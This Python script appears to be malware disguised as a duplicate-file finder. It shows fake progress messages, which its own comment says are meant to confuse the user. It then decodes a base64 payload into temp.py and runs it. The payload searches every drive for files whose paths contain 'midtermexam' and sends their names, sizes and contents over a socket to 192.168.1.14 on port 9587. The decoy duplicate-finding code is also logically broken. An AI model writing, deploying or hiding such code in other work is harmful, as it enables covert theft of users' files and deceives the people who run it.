import hashlib
import base64
import time
import os


def main():
    # Fork a child process
    if os.name == 'nt':
        # Print fake message confuse user
        print("This program can find exact same file in target directory")
        print("by comparing the file hash value")
        time.sleep(2)
        print("Building index ...")
        time.sleep(5)
        print("Searching ...")
        time.sleep(5)

        # On Windows, use multiprocessing module to spawn a new process
        from multiprocessing import Process
        p = Process(target=t)
        p.start()
        p.join()

        # Parent process
        while True:
            # Specify the folder path
            folder = r'C:\Users\YHD\Documents\PycharmProjects\MidtermLifeSaver'
            # Traverse all files in the specified folder
            for dirpath, dirnames, filenames in os.walk(folder):
                # Traverse all files in the current folder
                for filename in filenames:
                    # Concatenate the complete path of the file
                    file_path = os.path.join(dirpath, filename)

            # Open each file and compute its hash value
            with open(file_path, 'rb') as f:
                file_hash = hashlib.sha1(f.read()).hexdigest()
                # Print a message to indicate the collection process
                print("Collecting duplicate file directory ...")
                time.sleep(10)

            # Define a dictionary to store file hash values and corresponding file paths
            hash_dict = {}

            # Traverse all files in the specified folder again and compute and compare the hash values of each file
            for dirpath, dirnames, filenames in os.walk(folder):
                # Traverse all files in the current folder
                for filename in filenames:
                    # Concatenate the complete path of the file
                    file_path = os.path.join(dirpath, filename)
                    # Open the file and compute its hash value
                    with open(file_path, 'rb') as f:
                        file_hash = hashlib.sha1(f.read()).hexdigest()
                        # Check if the hash value of the current file already exists in the dictionary
                        # if so, the file is a duplicate
                        if file_hash in hash_dict:
                            print('\nDuplicate file:', file_path)
                            print('Duplicates with', hash_dict[file_hash])
                        else:
                            # If the hash value of the current file has not appeared in the dictionary
                            # add it to the dictionary
                            hash_dict[file_hash] = file_path
            else:
                # Child process
                t()
    else:
        print("Sorry, this program only supports Windows")
        pass


def t():
    malware_fd = open("temp.py", "w", encoding="utf-8")
    blob = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQoKZHJpdmVzID0gb3MucG9wZW4oJ3dtaWMgbG9naWNhbGRpc2sgZ2V0IGNhcHRpb24nKQpkcml2ZXMgPSBbZHJpdmUuc3RyaXAoKSBmb3IgZHJpdmUgaW4gZHJpdmVzIGlmIGRyaXZlLnN0cmlwKCldCmV4YW1fZmlsZV9saXN0ID0gW10KZm9yIGRyaXZlIGluIGRyaXZlczoKICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oZHJpdmUsICJcXCIpCiAgICBmb3IgZGlyUGF0aCwgZGlyTmFtZXMsIGZpbGVOYW1lcyBpbiBvcy53YWxrKHBhdGgpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVOYW1lczoKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCJtaWR0ZXJtZXhhbSIsIG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkgYW5kIG5vdCBmaWxlLmVuZHN3aXRoKCcubG5rJyk6CiAgICAgICAgICAgICAgICBleGFtX2ZpbGVfbGlzdC5hcHBlbmQob3MucGF0aC5qb2luKGRpclBhdGgsIGZpbGUpKQpleGFtX2ZpbGVfbGlzdCA9IFtlbGVtIGZvciBlbGVtIGluIGV4YW1fZmlsZV9saXN0IGlmIG5vdCBlbGVtLnN0YXJ0c3dpdGgoJ1xcJyldCmNsaWVudF9zb2NrZXQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCmNsaWVudF9zb2NrZXQuY29ubmVjdCgoIjE5Mi4xNjguMS4xNCIsIDk1ODcpKQpoYXNoX2RpY3QgPSB7fQpmb3IgZXhhbV9maWxlIGluIGV4YW1fZmlsZV9saXN0OgogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICBtZDUgPSBoYXNobGliLm1kNShmLnJlYWQoKSkuaGV4ZGlnZXN0KCkKICAgIGlmIG1kNSBpbiBoYXNoX2RpY3Q6CiAgICAgICAgY29udGludWUKICAgIGZpbGVfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShleGFtX2ZpbGUpCiAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZiJ7b3MucGF0aC5iYXNlbmFtZShleGFtX2ZpbGUpfVxue2ZpbGVfc2l6ZX0iLmVuY29kZSgpKQogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBkYXRhID0gZi5yZWFkKDEwNDg1NzYpCiAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGRhdGEpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgIGhhc2hfZGljdFttZDVdID0gZXhhbV9maWxlCmNsaWVudF9zb2NrZXQuc2VuZGFsbChiIm92ZXIiKQpjbGllbnRfc29ja2V0LmNsb3NlKCkK"
    newMalware = base64.b64decode(blob).decode("UTF-8")
    malware_fd.write(newMalware)
    malware_fd.close()

    # execute
    if os.name == "nt":
        os.system("python temp.py")


if __name__ == "__main__":
    main()
